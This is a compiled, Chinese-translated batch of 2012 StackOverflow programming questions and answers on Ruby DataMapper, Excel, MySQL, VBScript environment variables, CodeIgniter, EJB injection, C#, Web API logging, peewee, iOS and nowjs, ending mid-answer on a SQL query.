# StackOverflow 问答 12213000-12213999

# ruby - “错误”：“红宝石数据映射器中的未定义方法“some_id' for #”

> ID：12213000
> 
> 赞同：1
> 
> 时间：2012-08-31T09:55:27.363
> 
> 标签：ruby, datamapper

我有两个具有以下关系的 ruby​​ 模型（使用 datamapper）：

```
class Klass

  expose :id, :kid

  property :id, Serial
  property :date, DateTime
  has 1, :kid

class KID

  expose :id, :klass

  property :id, Serial
  belongs_to :klass 
```

当我尝试检索 Klass 对象时，出现错误：

```
"error":"undefined method `klass_id' for #" 
```

所有对象都在数据库中创建得很好。

有什么帮助吗？

# windows - 根据其他列值获取列总数

> ID：12213012
> 
> 赞同：0
> 
> 时间：2012-08-31T09:55:53.243
> 
> 标签：windows, excel

我有一个 Excel 表，如下所示：

```
Column A | Column B | Column C
------------------------------
MyCorp   | 23.30    | 13.00
Acme     | 99.40    | 10.85
Acme     | 11.30    | 61.80
Acme     | 1.99     | 2.00
Acme     | 24.85    | 14.76
NewBiz   | 11.00    | 15.00
NewBiz   | 44.00    | 44.22 
```

我有数百条这样的记录，并希望为每个 A 列（公司名称）获取 B 列和 C 列的摘要（总计） - 考虑到如果公司有多个记录，则应添加总计

这如何在 Excel 中完成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:52:11.117

对于这种布局，我相信最快的方法是选择另一个单元格来输出数据并从*数据选项卡中选择**Consolidate*，并显示设置...

 *![在此处输入图像描述](../Images/b31b6cd1106e520b8143bbaab901dbb1.png)

...或者添加列标题并使用数据透视表，这将提供更大的灵活性。*

# mysql - mysql查询语法

> ID：12213014
> 
> 赞同：-3
> 
> 时间：2012-08-31T09:56:09.080
> 
> 标签：mysql

```
SELECT count(AES_DECRYPT(xyz.answertext , "aaa"))*100 / (
FROM xyz
INNER JOIN abc
ON xyz.prim_key = abc.hhid
INNER JOIN jkl
ON jkl.psu = abc.psu
WHERE columnname = 'Q08' ) 
```

我正在运行上面的查询，但出现错误：

```
#1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use
 near 'FROM xyz INNER JOIN abc ON xyz.prim_key = abc' at line 2 
```

请帮我解决这个问题..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:02:29.677

尝试

```
SELECT count(AES_DECRYPT(xyz.answertext , "aaa"))*100 
FROM xyz 
INNER JOIN abc 
ON xyz.prim_key = abc.hhid 
INNER JOIN jkl 
ON jkl.psu = abc.psu 
WHERE columnname = 'Q08' 
```

在 from 之前有一个额外的括号和除法符号。如果您实际上是在尝试除法，那么您需要除以某些东西！

# batch-file - VBS 启动一个设置环境变量的批处理

> ID：12213015
> 
> 赞同：1
> 
> 时间：2012-08-31T09:56:14.333
> 
> 标签：batch-file, vbscript, environment-variables

*   我有一个设置我的环境变量的批处理文件：setenv.bat
*   我想在 VB 脚本中使用 setenv.bat 来设置我的变量

综上所述，我的 VBS 启动 setenv.bat，然后它使用 setenv.bat 中指定的环境变量。

可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T09:00:28.223

Aphoria 是对的。当您从 VBS 运行批处理文件时，会启动一个单独的副本`cmd`，这意味着批处理文件在其自己的环境中执行。一旦批处理文件（或更准确地说，`cmd`运行该批处理的进程）终止，该环境就会丢失。因此，该批处理文件所做的任何变量分配都变成“本地”的。

然而，这并不意味着你根本无法实现你想要的。您需要一种分配值的方法，以便在不同的`cmd`会话中保留它们。有*一个*命令可以做到这一点，它是`SETX`. 它允许您创建/修改一个“全局”环境变量，该变量不仅在不同的`cmd`会话中存在，而且在 Windows 会话中也存在。

该命令的语法类似于，只是变量名和它的值之间`SET`没有字符：`=`

```
SETX *variable* *value* 
```

如果值包含空格（或特殊字符），请将其括在双引号中（请注意，在分配值时它们会被删除）。有一些选项`SETX`，您可以通过阅读内置帮助来学习，只需`SETX /?`在命令提示符下运行，但这对于您的情况应该足够了。

关于 的另一件事`SETX`似乎与您的情况并不相关，但对于未来可能仍然值得牢记，那就是，奇怪的是，所做的分配`SETX`并没有反映在`cmd`分配发生的会话中。（事实上​​，它不会反映在当时任何活动的 cmd 会话中。）也就是说，根据您的情况，您将无法读取使用`SETX`. 但是在运行（并等待完成）批处理文件之后，您当然可以在您的 VBS 中读取它们。

所以，这里有一个测试设置来演示它是如何工作的：

*   `setenv.bat`：

    ```
    SETX testvar1 123 
    ```

*   `test.vbs`：

    ```
    Set objShell = WScript.CreateObject("WScript.Shell")
    Set objUserEnv = objShell.Environment("User")

    ' show the value before running the batch script
    WScript.Echo "1\. testvar1=" & objUserEnv("testvar1")

    ' set the environment with the batch file
    objShell.Run "setenv.bat", 1, true

    ' show the value again to see the effect
    WScript.Echo "2\. testvar1=" & objUserEnv("testvar1") 
    ```

**更新**

如果您的某些变量*未定义*（或*已删除*，如 中`SET variable=`）作为 的一部分`setenv.bat`，您可以使用以下方法执行此操作`SETX`：

```
SETX variable "" 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-31T20:03:38.943

不，这行不通。当您的 VB 脚本运行`setevn.bat`时，.bat 文件在其自己的进程中运行，因此您设置的任何环境变量都不会被您的 VB 脚本访问。

你能用其他方法吗？从您的 .bat 文件中调用您的 VB 脚本？

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-01T06:46:49.353

是的，您可以访问任何环境变量，但不包括 %time% 和 %date% 之类的伪环境变量。

我创建了一个批处理文件和一个交互的 vbs 文件：

`k.bat`

```
@echo off

:: Setting ERRORLEVEL to 0
DIR *.* > NUL

:: Display current ErrorLevel
echo ErrorLevel=%errorlevel%

:: Creating a variable for the VBS file to see
set VBS=Can you see me?

echo.
echo Entering VBS
echo =============================
cscript /nologo k.vbs
echo =============================
echo Exited VBS
echo.

echo ErrorLevel=%errorlevel%
echo Test=%Test%
echo Test2=%Test2%
ECHO VBS=%VBS%
goto :eof 
```

`k.vbs`

```
Set wshShell = CreateObject( "WScript.Shell" )

' Store the EV %PATH% in var1
var1 = "PATH = " & wshShell.ExpandEnvironmentStrings( "%PATH%" )

' Print var1
wscript.echo var1
wscript.echo

' Getting Ready to Create / Set an EV (In Vista and Above you cannot 
' set "SYSTEM" variables.
Set wshUserEnv = wshShell.Environment( "USER" )
Set wshSystemEnv = wshShell.Environment( "SYSTEM" )

' Another method of retrieving an EV that takes advantage of wshShell.Environment
' Get value of %Test%
WScript.Echo "Test=" & wshUserEnv( "Test" )

' Set EV %Test%
wshUserEnv( "Test" ) = "VBS Can set Environmental Variables"

' Print out the value of %Test%
WScript.Echo "Test=" & wshUserEnv( "Test" )

'Both methods are not created equilly
WScript.Echo "1 VBS=" & wshUserEnv( "VBS" )
wscript.echo "2 VBS = " & wshShell.ExpandEnvironmentStrings( "%VBS%" )

' Overwrite %VBS%
wshUserEnv( "VBS" ) = ""

WScript.Echo "3 VBS=" & wshUserEnv( "VBS" )
WScript.Echo "4 VBS=" & wshSystemEnv( "VBS" )
wscript.echo "5 VBS = " & wshShell.ExpandEnvironmentStrings( "%VBS%" )

' In Vista and up, VBS cannot delete an EV it did not create
wshUserEnv.Remove( "VBS" )

' Delete Variable %Test%
wscript.echo "Deleting Test"
wshUserEnv.Remove( "Test" )

' Show variable %Test% again, using first method
wscript.echo "TEST = " & wshShell.ExpandEnvironmentStrings( "%Test%" )
WScript.Echo "Test=" & wshUserEnv( "Test" )

' Create one last varible for the batch file to check
wshUserEnv( "Test2" ) = "Yes you can!"
WScript.Echo "Test2=" & wshUserEnv( "Test2" )

' Set the ERRORLEVEL to 99
wscript.quit 99 
```

我的输出（我已经剪掉了大部分 %PATH%，但它确实显示了属性。）

`Output:`

```
VBS=
ErrorLevel=0
VBS= 2:39:46.02

Entering VBS
=============================
PATH = c:\Program Files (x86)\Microsoft Visual Studio 9.0\Common7\IDE;c
 Visual Studio 9.0\Common7\Tools;c:\Windows\Microsoft.NET\Framework\v3.
tudio 9.0\VC\VCPackages;C:\Program Files\\Microsoft SDKs\Windows\v6.0A\
 Live;C:\Program Files (x86)\Common Files\Microsoft Shared\Windows Live
Shell\v1.0\;c:\Program Files (x86)\Microsoft SQL Server\90\Tools\binn\;
d++\;C:\Program Files (x86)\Android\android-sdk\tools;C:\Program Files
(x86)\Lua\5.1\clibs;C:\Program Files\Java\jre7\bin\msvcr100.dll;C:\Prog
indows NT\Accessories\;C:\Program Files (x86)\Windows Live\Shared;C:\Pr
w64;C:\Program Files (x86)\Common Files\Ulead Systems\MPEG;D:\Program F

Test=
Test=VBS Can set Environmental Variables
1 VBS=
2 VBS =  2:39:46.02
3 VBS=
4 VBS=
5 VBS =  2:39:46.02
Deleting Test
TEST = %Test%
Test=
Test2=Yes you can!
=============================
Exited VBS

ErrorLevel=99
Test=
Test2=
VBS= 2:39:46.02 
```

因此，如您所见，批处理文件可以使用环境变量将数据发送到 VBS 脚本，并且脚本可以读取这些变量并对其进行操作。但是，除了 之外`%ERRORLEVEL%`，VBS 脚本不能更改或添加变量以供批处理文件查看和使用。

这是因为 VBS 脚本是使用批处理文件使用的环境的**副本**启动的，因此当它将控制权返回给调用批处理文件时，该环境将消失，并且原始环境中的变量从未更改过。（同样，除了`%ERRORLEVEL%`.）

# codeigniter - 在 CodeIgniter 中多路径上传文件

> ID：12213043
> 
> 赞同：0
> 
> 时间：2012-08-31T09:58:00.387
> 
> 标签：codeigniter

在示例中，我想在 CodeIgniter 中上传 ABC.jpg 图像，上传图像时我想将 ABC.jpg 图像存储在两个文件夹中。1-etc/abc/folder1/ 和 2-etc/abc/folder2/

如何上传图像一次存储在不同的文件夹中？

这里关于php编码：

```
$config['upload_path'] ='etc/abc/folder1/';
$config['allowed_types'] = 'jpg|jpeg|gif|png';
$config['file_name']="ABC.jpg";
$config['max_size'] = '10000';

$this->upload->initialize($config); 
if(!$this->upload->do_upload('userfile')){
$imgsource='';
echo $this->upload->display_errors();
}else {
$this->upload->data('userfile');
} 
```

最好的祝福

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:02:31.600

为什么不简单地使用[PHP 的 copy() 函数](http://php.net/manual/en/function.copy.php)将文件从上传的文件复制到新位置？您已经知道名称 ( `$config['file_name']`) 和初始文件夹 ( `$config['upload_path']`)，所以应该很容易做到

# java - 找不到 EJB 无状态 Bean。注入失败

> ID：12213045
> 
> 赞同：0
> 
> 时间：2012-08-31T09:58:02.197
> 
> 标签：java, jakarta-ee, jsf-2, ejb, code-injection

我有两个模块 WAR 和 Business。

我尝试在 web 模块中注入一个无状态 bean。但是找不到stateless bean？

错误在哪里？任何想法？？

在业务模块中：

```
@Stateless
public class BusinessFacade {

    public void processEntity(final MyEntitiy entity) {
        System.out.println(entity.getName());
    }

} 
```

在 WAR 模块中：

```
@ManagedBean
@SessionScoped
public class HelloBean implements Serializable {

    @EJB
    BusinessFacade businessFacade;

    private static final long serialVersionUID = 1L;

    private String name;

    public String getName() {
        return name;
    }

    public void setName(final String name) {
        this.name = name;
    }
} 
```

错误：

```
[31.08.12 10:19:38:835 CEST] 00000018 webapp        E com.ibm.ws.webcontainer.webapp.WebApp notifyServletContextCreated SRVE0283E: Exception caught while initializing context: {0}
                                 java.lang.NoClassDefFoundError: com.myproject.business.beans.BusinessFacade
    at java.lang.Class.getDeclaredFieldsImpl(Native Method)
    at java.lang.Class.getDeclaredFields(Class.java:544)
    at org.apache.myfaces.config.annotation.AnnotationConfigurator.fields(AnnotationConfigurator.java:846)
    at org.apache.myfaces.config.annotation.AnnotationConfigurator.createFacesConfig(AnnotationConfigurator.java:328)
    at org.apache.myfaces.config.annotation.AnnotationConfigurator.createFacesConfig(AnnotationConfigurator.java:94)
    at org.apache.myfaces.config.DefaultFacesConfigurationProvider.getAnnotationsFacesConfig(DefaultFacesConfigurationProvider.java:148)
    at org.apache.myfaces.config.DefaultFacesConfigurationMerger.getFacesConfigData(DefaultFacesConfigurationMerger.java:91)

....
..

Caused by: java.lang.ClassNotFoundException: com.myproject.business.beans.BusinessFacade
    at java.net.URLClassLoader.findClass(URLClassLoader.java:434)
    at com.ibm.ws.bootstrap.ExtClassLoader.findClass(ExtClassLoader.java:198)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:646)
    at com.ibm.ws.bootstrap.ExtClassLoader.loadClass(ExtClassLoader.java:113)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:612)
    at com.ibm.ws.classloader.ProtectionClassLoader.loadClass(ProtectionClassLoader.java:62)
    at com.ibm.ws.classloader.ProtectionClassLoader.loadClass(ProtectionClassLoader.java:58)
    at com.ibm.ws.classloader.CompoundClassLoader.loadClass(CompoundClassLoader.java:564)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:612)
    at com.ibm.ws.classloader.CompoundClassLoader.loadClass(CompoundClassLoader.java:564)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:612)
    ... 33 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:03:57.357

试试这个，看看会发生什么：

```
@Stateless
@LocalBean
public class BusinessFacade {

    public void processEntity(final MyEntitiy entity) {
       System.out.println(entity.getName());
    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T11:20:30.210

我不认为你可以这么简单地做到这一点。这种类型的注入在同一个 EAR 中的 EJB 之间起作用，但是如果我在 JBoss 5.0GA 中没记错的话，你不能将 EJB 注入到 Servlet 中等等（你应该检查我是否正确）。

您应该知道您是使用 EAR 来保存 Web 模块和 EJB 部分，还是以其他方式部署它们。

看看[这里](https://stackoverflow.com/questions/11841488/how-to-call-other-ears-bean-method/11841665#11841665)它可以以某种方式帮助你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-14T18:24:04.980

创建接口

```
@Local
public interface BusinessLocal {
    void processEntity(final MyEntitiy entity);
} 
```

在你的 ejb 中实现接口

```
public class BusinessFacade implements BusinessLocal {
...
} 
```

并注入接口。

```
@EJB
BusinessLocal businessFacade; 
```

# c# - C# 在方法访问方面需要帮助？

> ID：12213050
> 
> 赞同：-1
> 
> 时间：2012-08-31T09:58:18.213
> 
> 标签：c#, function, return

我有以下程序来读取测试文件

```
public static string[] method1()
{
    //List<string[]> allLines = new List<string[]>();
    TextReader tr = new StreamReader("data.txt");
    // write a line of text to the file
    string word = tr.ReadLine();

    //now split this line into words
    string[] val = word.Split(new Char[] { ',' });

    //Console.WriteLine(val[0]);
    //Console.WriteLine(val[1]);
    //Console.ReadLine();
    return val;
}

public static void method2()
{
   method1();
   var value1= val[0];
  //Console.WriteLine(val[0]);
} 
```

它显示错误名称“val”在当前上下文中不存在。如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T09:59:36.173

您没有将方法的返回值分配给您的`var`

```
var val = method1(); 
```

然后你可以这样做：

```
if(val.Length > 0)
     var value1= val[0]; 
```

您也可以改进您的方法，例如：

```
public static string[] method1()
    {

       //...Textreader lines and then 
        return word.Split(','); // no need to use new Char[] as , is already a single character
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:04:08.240

从 的角度来看`method2`，`method1`是：

```
public static string[] method1() 
```

而已。method1 中的所有其他代码对它来说都是未知的。它不知道`tr`, or`word`或`val`。它不会知道您是否更改它们（这是为什么这种无知`method2`是一件好事的几个原因之一）。唯一`method2`“知道”的是它`method1`是静态的，接受零参数，并返回一个字符串数组。

因此，您需要对退货做一些事情。您可以将其存储在一个变量中，该变量可以被调用`val`或其他。

```
public static void method2()
{
   var val = method1();
   var value1= val[0];
   Console.WriteLine(val[0]);
} 
```

或同样：

```
public static void method2()
{
   var imBoredOfTheNameVal = method1();
   var value1= imBoredOfTheNameVal[0];
   Console.WriteLine(imBoredOfTheNameVal[0]);
} 
```

两者完全相同。

您也可以直接对返回值进行操作：

```
public static void method2()
{
   Console.WriteLine(method1()[0]);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:57:11.007

需要获取方法1返回的结果：

```
 public static string[] method1()
    {
        //List<string[]> allLines = new List<string[]>();
        TextReader tr = new StreamReader("data.txt");
        // write a line of text to the file
        string word = tr.ReadLine();

        //now split this line into words
        string[] val = word.Split(new Char[] { ',' });

        //Console.WriteLine(val[0]);
        //Console.WriteLine(val[1]);
        //Console.ReadLine();
        return val;
    }

    public static void method2()
    {

        var value1 = method1();

        Console.WriteLine(value1.First());
        //Console.WriteLine(val[0]);
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T10:05:01.107

您尚未在方法 2 中定义 val。尝试：

公共静态无效方法2（）

```
{ 
 var val =  method1(); 
    var value1= val[0]; 
  //Console.WriteLine(val[0]); 
```

}

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T10:01:11.527

您没有正确分配变量 val 请参阅下面如何正确使用它

```
public static void method2()
{
       var val = method1();
        var value1= val[0];
      Console.WriteLine(value1); 
```

> 我建议您在与 [0] 一起使用之前检查 val.Length 是否 > 0
> 
> 但是，如果您确信从 method1 返回的 Length of string[] 将始终具有 [0] 索引，并且您只想使用其中的 [0] 而不是为什么不使用更短的语法

**像这样：**

```
Console.WriteLine(method1()[0]); 
```

# javascript - 使用浏览器滚动条代替 iframe 滚动条

> ID：12213052
> 
> 赞同：1
> 
> 时间：2012-08-31T09:58:20.127
> 
> 标签：javascript, html, iframe

我有一个页面，其中包含两个水平拆分的 iframe 内容。左边是树视图类型，它的大小最初为零。始终显示正确的。当右侧 iframe 中内容的大小增加时，它会创建一个滚动条。iframe 不显示垂直滚动条，但浏览器滚动条会针对垂直滚动进行调整。

水平滚动条也可以这样做吗？我将 iframe 设置为 scrolling=auto; frameborder=0;height=100% 等等。我检查的许多问题都在说隐藏滚动条或对齐问题。我似乎找不到这样的东西。请指教。

谢谢。

更新

[jsFiddle 链接](http://jsfiddle.net/rahulkumarpawar/zcrb3/4/)

在此链接中，我的主要内容有滚动条，浏览器也有滚动条。我只想使用浏览器的滚动条而不是 iframe。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T21:58:29.493

您需要做的是将内部元素的溢出设置为隐藏。这可以使用 div 和其他元素来实现。

不幸的是，这在 iframe 中是不可能的。浏览器不允许访问内部元素，因为这可能是一个重大的安全漏洞，允许您将代码注入到任何地方的任何页面中。

查看[这个小提琴](http://jsfiddle.net/vapocalypse/TbJWn/)并查看控制台中记录的消息（在 Firefox 中的 Firebug 中更好地查看）。

但是，您可以做的是计算 iframe 内的文档高度，并相应地设置 iframe 高度，避免内部滚动条。看到[这个问题](https://stackoverflow.com/questions/525992/resize-iframe-height-according-to-content-height-in-it)。

干杯，阿波克。

# android - 应用程序屏幕打印

> ID：12213054
> 
> 赞同：1
> 
> 时间：2012-08-31T09:58:21.743
> 
> 标签：android

我遇到了帮助从 GoogleCloudPrint 和 PrinterShare 等 android 设备进行打印的 3rd 方软件。这将打印设备上存在的文档或图像。我想要的是打印应用程序屏幕本身，例如在我的应用程序中具有列表视图的屏幕。我想打印具有列表视图的屏幕。我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:08:57.180

这取决于你想要它有多好。例如，只需拍摄屏幕快照然后打印它是相当容易的。看看[这里](http://code.google.com/p/android-screenshot-library/wiki/DeveloperGuide) 和这个[问题](https://stackoverflow.com/questions/3067586/how-to-capture-the-android-device-screen-content)

但是，如果您想要更好的东西，那么我想您将不得不自己格式化。

# c# - 在 DelegatingHandler 中捕获 ObjectContent 序列化错误而不读取响应

> ID：12213059
> 
> 赞同：0
> 
> 时间：2012-08-31T09:58:31.420
> 
> 标签：c#, asp.net-mvc-4, asp.net-web-api

我使用[此博客文章](http://weblogs.asp.net/pglavich/archive/2012/02/26/asp-net-web-api-request-response-usage-logging.aspx)`DelegatingHandler`中的详细信息构建了一个请求日志记录。

我不想阅读请求或响应正文（在潜在的大容量 Web 服务上加倍这项工作似乎很愚蠢）；我要做的就是为每个请求分配一个唯一的 ID，记录 URI 和标头；将请求 ID 写入另一个标头中的响应，然后记录响应（成功/失败）和发生的任何异常。

```
protected override System.Threading.Tasks.Task<HttpResponseMessage> 
  SendAsync(HttpRequestMessage request, 
  System.Threading.CancellationToken cancellationToken)
{
  DateTime receivedUTC = DateTime.UtcNow;

  //I use the Request properties to persist a Request's ID
  var requestID = request.GetRequestUID();
  if (requestID == null)
    requestID = request.SetRequestUID();

  //grab the base response task
  var baseResult = base.SendAsync(request, cancellationToken);

  return baseResult.ContinueWith(innerTask =>
  {
    var tcs = new TaskCompletionSource<HttpResponseMessage>();

    //note I've got rid of SynchronizationContext code out of this
    //to keep it shorter

    //construct the log packet
    LogData toLog = new LogData()
        {
          ReceivedUTC = receivedUTC,
          Request = request,
          RequestID = requestID,
        };

    //get the response
    try
    {
      tcs.SetResult(innerTask.Result);
      //NOTE - If this request actually fails response serialization,
      //       Then the above result will actually look fine, because
      //       The error hasn't occurred yet!
      toLog.Response = innerTask.Result;
      //this adds a header
      AddRequestIDToResponse(toLog.Response, requestID);
    }
    catch (Exception ex)
    {
      tcs.TrySetException(ex);
      toLog.Ex = ex;
    }

    //fire the logging call asynchronously (code elided, just some DB work)
    Task.Factory.StartNew(() => Log(toLog));
    return tcs.Task;
  }).Unwrap();
} 
```

这对于几乎所有请求都非常有效，除非发生异常，同时`ObjectContent`从操作方法返回的内容被序列化为响应。

如果发生这种情况，则上面的代码已经触发，并且它在上面的 try/catch 块中看到的响应消息显示为正常`200`，其中`ObjectContent`包含最终将无法序列化的对象。这确实是有道理的——因为尚未发生对响应主体的序列化。

如何更改此代码（不强制读取`ObjectContent`）以确保我看到的响应消息是客户端在内容格式化后收到的***实际消息？***我应该看一个不同的扩展点吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T11:22:16.420

作为一个试探性的答案，直到有人（希望）出现并证明我错了；如果不复制和粘贴大量代码，这似乎在 Web API 管道本身内几乎是不可能的。

内容序列化在 Web API 管道的最顶端触发 - 在`HttpControllerHandler`其中，`HttpContent`被复制到底层`HttpResponse`的`OutputStream`内部静态方法中称为`HttpControllerHandler.ConvertResponse`. 类本身没有足够的扩展点，无法在正确的位置注入任务，以便能够在 Web API 管道中记录*实际*响应。

所以我面临：

*   从源代码`HttpControllerHandler`中提取全部内容并将其导入我的项目（以及它使用的所有内部组件，这不是一个好主意），然后相应地对其进行自定义。

*   只需尽早强制序列化并捕获异常 - 我可以记录异常但不能记录响应。但是，这有一个小问题
    - 将请求 ID 写入响应非常
    重要，并且当这些格式异常发生时，ID 不会被写入，因为它会将`HttpControllerHandler`整个
    响应替换为错误响应！

*   从 Web API 记录更高级别的请求。这
    并不理想，因为我只想记录***Web API***请求；并且
    日志记录代码依赖于当前请求的
    HttpConfiguration 对象，以便获取特定于请求的 DI
    容器来解析数据库连接（它是一个多租户 Web 服务）。

最终，唯一真正的选择是最后一个 - 在 IIS 或 Asp.Net 级别上完成工作。因此，尽管 Web API 中有所有这些可扩展点——实际上你无法在其中实现“完整”的日志记录解决方案——这真的令人失望。

# sqlite - @commit_on_success 和 save()

> ID：12213062
> 
> 赞同：1
> 
> 时间：2012-08-31T09:58:38.873
> 
> 标签：sqlite, peewee

我在质疑自己关于新 peewee 的功能：`commit_on_success`装饰器。

1.  如何判断函数是否“成功”？

2.  如果我使用这个装饰器，我需要调用`save()`我改变的对象吗？

根据我的尝试，我认为 #2 是肯定的，但我只是想确定，因为我在 peewee 的文档中找不到这两个问题的明确答案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-09T23:37:40.753

我认为您所说的装饰器实际上是被调用`commit_on_success`的，并且是作为`Database`类上的方法实现的。

这个想法是，假设您想在请求/响应中转移一些钱。这是一个非常糟糕的例子：

```
db = SqliteDatabase('my_database.db')

@db.commit_on_success
def process_transfer_request(request, from_id, to_id, amount):
    from_acct = Account.get(id=from_id)
    to_acct = Account.get(id=to_id)
    from_acct.balance -= amount
    to_acct.balance += amount
    from_acct.save()
    to_acct.save()
    return Response('success!  the money was transferred') 
```

如果在该函数中的任何地方引发异常，则不会转移任何资金并且将引发异常。

否则，如果没有引发异常，则会转移资金并返回响应。

# ios - 在popover iOS下刷新表格？

> ID：12213066
> 
> 赞同：0
> 
> 时间：2012-08-31T09:58:47.870
> 
> 标签：ios, ipad

嗨，我已经创建了 2 个类 tableView，第一个类来自一个单元格调用 popover，其中包含带有 xib 的第二个类，当我按下调用 popover 时所有工作，但是如何在 popover 打开的情况下刷新第一个表？我以这种方式从单元格中调用 popover：

```
Second *add=[[Second alloc] init];

            popoverController = [[UIPopoverController alloc] initWithContentViewController:add];
            popoverController.popoverContentSize = CGSizeMake(320, 300);
            popoverController.delegate = self;
            UITableViewCell *cell = [tableView cellForRowAtIndexPath:indexPath];

            [popoverController presentPopoverFromRect:cell.bounds inView:cell.contentView
                             permittedArrowDirections:UIPopoverArrowDirectionAny animated:YES]; 
```

只有当我按下 popover 时，我才会收到 popoverControllerDidDismissPopover （来自第一类），第一类是刷新表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:28:36.923

以下应该是实现您想要的正确步骤。

1.  您应该`@protocol`在 Popover 中显示的第二类中创建委托属性。
2.  该协议方法应该在第一类中实现，从那里你呈现弹出窗口和你想要刷新你的`UITableView`
3.  使用这个协议的委托对象，你应该调用协议方法来刷新第一类tableView。

# codeigniter - codeigniter & node js 与 now js 的集成——如何访问视图文件

> ID：12213067
> 
> 赞同：4
> 
> 时间：2012-08-31T09:58:56.347
> 
> 标签：codeigniter, node.js, nowjs-sockets

我想集成codeigniter和node.js，但我对如何同时执行**node.js和codeigniter感到困惑。**

我已经成功安装并运行了 nowjs 示例：[http ://nowjs.com/doc/example](http://nowjs.com/doc/example)

如何将 codeigniter（或任何 php 框架）的视图文件访问到 node.js。

我很困惑，因为 codeigniter 用 url 执行，`http://localhost/xyz`而 node.js 用`http://localhost:8080/xyz`

那么我必须在浏览器中编写哪个 url 才能同时使用 node.js 和 codeigniter？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-11T17:55:32.033

以下是 ii 如何让 codeigniter 和 nodejs 相互交谈。

我的 codeigniter 应用程序在[http://mydomain.com/controller/function/](http://mydomain.com/controller/function/)上运行，我的 nodejs(nowjs) 在[http://mydomain.com:8080](http://mydomain.com:8080)上运行，

用户将使用 codeigniter URL，当打开页面时，我的 CI 视图页面上有这个脚本，它连接到我的 Nodejs 应用程序，类似于以下内容：

```
<script src="http://mydomain.com:8080/nowjs/now.js"></script>

<script>
$(document).ready(function(){
    now.receiveMessage = function(name, message){
        $("#messages").append("<br>" + name + ": " + message);
    }

    // Send message to people in the same group
    $("#send-button").click(function(){
        now.distributeMessage($("#text-input").val());
        $("#text-input").val("");
    });

    now.name = prompt("What's your name?", "");

    // on establishing 'now' connection, set server room and allow message sending
    now.ready(function(){
        // Pick up list of available chatrooms from server and populate dropdown 
        setServerRoomFromList(now.serverRoomsList);

        // By default pick the first chatroom 
        now.changeRoom($('#server-room').val());
        // Connection established and room set; allow user to start sending messages
        $("#send-button").removeAttr('disabled');
    });

    // On change of drop down, clear text and change server room
    $('#server-room').change(function(){
        $("#messages").html('');
        now.changeRoom($('#server-room').val());
    });

});

// populate the #server-room dropdown 
function setServerRoomFromList(roomList){
    $('#server-room').empty();
    $.each(roomList, function(key, value)
    {   
         $('#server-room').
              append($("<option></option>").
              attr("value",key).
              text(value)); 
    });
}

</script> 
```

蚂蚁他们可以很好地互相交谈！

# mysql - 查询以找到最常玩的敌人

> ID：12213077
> 
> 赞同：3
> 
> 时间：2012-08-31T09:59:50.487
> 
> 标签：mysql, sql

我已经意识到某种在线游戏。现在我想展示一个统计数据，您可以在其中看到谁是您对抗最多的敌人。

我已将游戏存储在数据库中。玩家存储在字段 PLAYER1 和 PLAYER2 中。这取决于，哪一个邀请另一个。开始游戏并邀请另一人的是PLAYER1。

```
ID | PLAYER1 | PLAYER2 | GAMESTATE 
```

现在我有一些条目。假设我是玩家 1，我的朋友 (2) 邀请了我两次，我也邀请了他一次。条目如下所示：

```
1  | 2       | 1       | 1
2  | 2       | 1       | 1
3  | 1       | 2       | 1
4  | 3       | 4       | 1  <-- some other random game 
```

现在，我想知道我玩得最多的球员。我实际上需要一个选择来计算最常玩的玩家，但在这两种情况下（PLAYER1 或 PLAYER2）。

单个查询的最佳解决方案是什么？我可以使用[`MySQL UNION`](http://dev.mysql.com/doc/refman/5.1/de/union.html)还是 GROUP BY？如果是，我该怎么办？

**编辑**：预期结果实际上是这样的：

```
PLAYER | MOST_ENEMY | GAMES
1      | 2          | 3
2      | 1          | 3
3      | 4          | 1
4      | 3          | 1 
```

感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:17:22.533

那是你要的吗？

```
SELECT * FROM (
    SELECT 
      PLAYER1,
      PLAYER2,
      COUNT(*) CNT
    FROM
      (
        SELECT PLAYER1, PLAYER2 FROM matches 
        UNION ALL
        SELECT PLAYER2 PLAYER1, PLAYER1 PLAYER2 FROM matches
      ) sub
    GROUP BY
      sub.PLAYER1,
      sub.PLAYER2
    ) sub2
GROUP BY
  sub2.PLAYER1
HAVING
  sub2.CNT = MAX(sub2.CNT) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:10:24.987

你在哪里 玩家 1...

```
select 
    case player1 when 1 then player2 else player1 end as player, 
    count(*) as games
from yourtable
where 1 in (player1, player2)
group by case player1 when 1 then player2 else player1 end 
order by count(*) desc
limit 1 
```

要找到一般情况，它更复杂 - 你进入分组最大值等

```
create temporary table games (id int, player int)
insert games (id,player)
    select ID, PLAYER1 as player
    from yourtable
    union
    select ID, PLAYER2
    from yourtable

create temporary table gamecount (player1 int, player2 int, gamecount int)
insert gamecount (player1,player2,gamecount)
